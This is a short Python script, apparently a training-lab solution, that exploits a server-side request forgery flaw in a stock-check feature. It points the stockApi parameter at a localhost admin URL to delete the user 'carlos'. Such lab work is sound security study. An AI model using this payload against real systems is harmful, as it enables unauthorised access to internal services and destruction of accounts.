'''
Lab #1 - Basic SSRF against the local server

Vulnerable feature - stock check functionality

Goal - change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

Analysis:

localhost - http://localhost/
admin interface - http://localhost/admin
delete carlos - http://localhost/admin/delete?username=carlos
'''

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    delete_path = 'http://localhost/admin/delete?username=carlos'
    product_path = 'product/stock'
    params = {'stockApi': delete_path}
    requests.post(url+product_path, data=params, verify=False, proxies=proxies)

    # check if the user was deleted successfully
    admin_path= 'http://localhost/admin'
    params2 = {'stockApi': admin_path}
    res = requests.post(url+product_path, data=params2, verify=False, proxies=proxies)

    if 'User deleted successfully' in res.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    else:
        url = sys.argv[1]
        print('(+) Deleting the user...')
        delete_user(url)

if __name__ == "__main__":
    main()

